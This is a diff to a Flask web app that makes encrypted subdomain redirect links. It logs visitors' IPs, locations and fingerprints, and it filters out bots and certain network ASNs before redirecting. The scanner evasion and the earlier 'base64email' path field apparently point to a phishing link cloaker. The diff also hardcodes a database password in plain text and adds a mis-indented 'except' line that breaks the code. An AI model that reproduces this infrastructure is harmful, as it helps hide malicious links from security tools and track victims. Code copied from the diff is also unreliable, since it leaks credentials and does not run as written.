@@ -47,7 +47,7 @@ VALKEY_PORT = 25708
 VALKEY_USERNAME = "default"
 VALKEY_PASSWORD = "AVNS_Yzfa75IOznjCrZJIyzI"
 DATA_RETENTION_DAYS = 90
-USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
+USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/bispecial/main/user.txt")
 
 # Flask configuration
 try:
@@ -81,24 +81,9 @@ class GenerateURLForm(FlaskForm):
         Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
         Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
     ])
-    randomstring1 = StringField('Randomstring1', validators=[
-        DataRequired(message="Randomstring1 is required"),
-        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
-        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
-    ])
-    base64email = StringField('Base64email', validators=[
-        DataRequired(message="Base64email is required"),
-        Length(min=2, max=100, message="Base64email must be 2-100 characters"),
-        Regexp(r'^[A-Za-z0-9_@.]+$', message="Base64email can only contain letters, numbers, _, @, or .")
-    ])
     destination_link = StringField('Destination Link', validators=[
         DataRequired(message="Destination link is required"),
         URL(message="Invalid URL format (must start with http:// or https://)")
-    ])
-    randomstring2 = StringField('Randomstring2', validators=[
-        DataRequired(message="Randomstring2 is required"),
-        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
-        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
     ])
     expiry = SelectField('Expiry', choices=[
         ('3600', '1 Hour'),
@@ -567,7 +552,7 @@ def log_visitor():
 
         if valkey_client:
             try:
-                valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
+                visitor_data = {
                     "timestamp": timestamp,
                     "ip": ip,
                     "country": location['country'],
@@ -591,7 +576,8 @@ def log_visitor():
                     "referer": referer,
                     "source": 'referral' if referer else 'direct',
                     "session_duration": session_duration
-                })
+                }
+                valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping=visitor_data)
                 valkey_client.zadd(f"user:{username}:visitor_log", {visitor_id: timestamp})
                 valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
                 valkey_client.zremrangebyrank(f"user:{username}:visitor_log", 0, -1001)
@@ -764,10 +750,7 @@ def dashboard():
         if form.validate_on_submit():
             logger.debug(f"Processing form data: {form.data}")
             subdomain = bleach.clean(form.subdomain.data.strip())
-            randomstring1 = bleach.clean(form.randomstring1.data.strip())
-            base64email = bleach.clean(form.base64email.data.strip())
             destination_link = bleach.clean(form.destination_link.data.strip())
-            randomstring2 = bleach.clean(form.randomstring2.data.strip())
             analytics_enabled = form.analytics_enabled.data
             expiry = int(form.expiry.data)
 
@@ -777,8 +760,6 @@ def dashboard():
                 logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
-                # Generate path_segment as a placeholder (dynamic, can be changed)
-                path_segment = f"{randomstring1}{base64email}{randomstring2}"
                 endpoint = generate_random_string(8)
                 encryption_methods = ['heap_x3', 'slugstorm', 'signed_token']
                 method = secrets.choice(encryption_methods)
@@ -802,13 +783,12 @@ def dashboard():
                     error = "Failed to encrypt payload"
 
                 if not error:
-                    # Generate URL with dynamic components
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
+                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}"
                     url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                     if valkey_client:
                         try:
                             valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
-                                "url": generated_url,  # Store for display only
+                                "url": generated_url,
                                 "destination": destination_link,
                                 "encrypted_payload": encrypted_payload,
                                 "endpoint": endpoint,
@@ -897,17 +877,15 @@ def dashboard():
                 logger.debug(f"Fetching visitor keys for user: {username}")
                 visitor_ids = valkey_client.zrevrange(f"user:{username}:visitor_log", 0, -1)
                 logger.debug(f"Found {len(visitor_ids)} visitor IDs")
-                if not visitor_ids:
-                    logger.warning(f"No visitor IDs found for user: {username}")
                 for visitor_id in visitor_ids:
                     try:
                         visitor_data = valkey_client.hgetall(f"user:{username}:visitor:{visitor_id}")
                         if not visitor_data:
                             logger.warning(f"Empty visitor data for ID {visitor_id}")
                             continue
-                        source = 'referral' if visitor_data.get('referer') else 'direct'
+                        source = visitor_data.get('source', 'direct')
                         visitor_entry = {
-                            "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'Not Available',
+                            "timestamp": int(visitor_data.get('timestamp', 0)),
                             "ip": visitor_data.get('ip', 'Not Available'),
                             "country": visitor_data.get('country', 'Not Available'),
                             "country_code": visitor_data.get('country_code', 'N/A'),
@@ -933,7 +911,7 @@ def dashboard():
                         visitors.append(visitor_entry)
                         if visitor_data.get('bot_status') != 'Human':
                             bot_logs.append({
-                                "timestamp": visitor_data.get('timestamp', 'Not Available'),
+                                "timestamp": int(visitor_data.get('timestamp', 0)),
                                 "ip": visitor_data.get('ip', 'Not Available'),
                                 "block_reason": visitor_data.get('block_reason', 'N/A')
                             })
@@ -1074,7 +1052,6 @@ def dashboard():
                     <div id="urls-tab" class="tab-content">
                         <div class="bg-white p-8 rounded-xl card mb-8">
                             <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
-                            <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, Base64email, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                             <form method="POST" class="space-y-5">
                                 {{ form.csrf_token }}
                                 <div>
@@ -1082,20 +1059,8 @@ def dashboard():
                                     {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
-                                    <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
-                                    {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
-                                </div>
-                                <div>
-                                    <label class="block text-sm font-medium text-gray-700">Base64email</label>
-                                    {{ form.base64email(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
-                                </div>
-                                <div>
                                     <label class="block text-sm font-medium text-gray-700">Destination Link</label>
                                     {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
-                                </div>
-                                <div>
-                                    <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
-                                    {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
                                     <label class="block text-sm font-medium text-gray-700">Expiry</label>
@@ -1253,7 +1218,7 @@ def dashboard():
                                         <tbody>
                                             {% for visitor in visitors %}
                                                 <tr class="{% if visitor.bot_status != 'Human' %}bot{% endif %}">
-                                                    <td>{{ visitor.timestamp }}</td>
+                                                    <td>{{ visitor.timestamp|datetime }}</td>
                                                     <td>{{ visitor.ip }}</td>
                                                     <td>{{ visitor.country }}</td>
                                                     <td>{{ visitor.country_code }}</td>
@@ -1588,7 +1553,7 @@ def export_visitors():
                     mimetype='text/csv',
                     headers={"Content-Disposition": f"attachment;filename=visitors_{username}.csv"}
                 )
-            except Exception as e:
+                        except Exception as e:
                 logger.error(f"Valkey error in export_visitors: {str(e)}")
                 return render_template_string("""
                     <!DOCTYPE html>
@@ -1781,9 +1746,9 @@ def fingerprint():
         logger.error(f"Error in fingerprint: {str(e)}", exc_info=True)
         return {"status": "error"}, 500
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
+@app.route("/<endpoint>/<path:encrypted_payload>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=5, per=60)
-def redirect_handler(username, endpoint, encrypted_payload, path_segment):
+def redirect_handler(username, endpoint, encrypted_payload):
     try:
         base_domain = get_base_domain()
         user_agent = request.headers.get("User-Agent", "")
@@ -1793,8 +1758,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         session_start = session.get('session_start', int(time.time()))
         session['session_start'] = session_start
         logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
-                     f"encrypted_payload={encrypted_payload[:20]}..., path_segment={path_segment}, "
-                     f"IP={ip}, User-Agent={user_agent}, URL={request.url}")
+                     f"encrypted_payload={encrypted_payload[:20]}..., IP={ip}, User-Agent={user_agent}, URL={request.url}")
 
         is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
         asn_blocked = check_asn(ip)
@@ -1896,7 +1860,6 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     else:
                         payload = decrypt_signed_token(encrypted_payload)
                     logger.debug(f"Decryption successful with {method}")
-                    # Cache the payload in Valkey
                     if valkey_client:
                         try:
                             expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
@@ -1908,13 +1871,6 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     break
                 except Exception as e:
                     logger.debug(f"Decryption failed with {method}: {str(e)}")
-                    # Enhanced logging for debugging
-                    if method == 'slugstorm' and 'InvalidSignature' in str(e):
-                        logger.debug(f"Slugstorm signature mismatch: payload={encrypted_payload[:50]}...")
-                    elif method == 'heap_x3' and 'InvalidTag' in str(e):
-                        logger.debug(f"Heap_x3 tag mismatch: payload={encrypted_payload[:50]}...")
-                    elif method == 'signed_token' and 'InvalidSignature' in str(e):
-                        logger.debug(f"Signed_token signature mismatch: payload={encrypted_payload[:50]}...")
                     continue
 
         if not payload:
@@ -1954,9 +1910,8 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
-        final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
-        logger.info(f"Redirecting to {final_url}")
-        return redirect(final_url, code=302)
+        logger.info(f"Redirecting to {redirect_url}")
+        return redirect(redirect_url, code=302)
     except Exception as e:
         logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -1978,16 +1933,15 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             </html>
         """, error=str(e)), 500
 
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
+@app.route("/<endpoint>/<path:encrypted_payload>", methods=["GET"])
 @rate_limit(limit=5, per=60)
-def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
+def redirect_handler_no_subdomain(endpoint, encrypted_payload):
     try:
         host = request.host
         username = host.split('.')[0] if '.' in host else "default"
         logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}, "
-                     f"encrypted_payload={encrypted_payload[:20]}..., path_segment={path_segment}, "
-                     f"URL={request.url}")
-        return redirect_handler(username, endpoint, encrypted_payload, path_segment)
+                     f"encrypted_payload={encrypted_payload[:20]}..., URL={request.url}")
+        return redirect_handler(username, endpoint, encrypted_payload)
     except Exception as e:
         logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
         return render_template_string("""
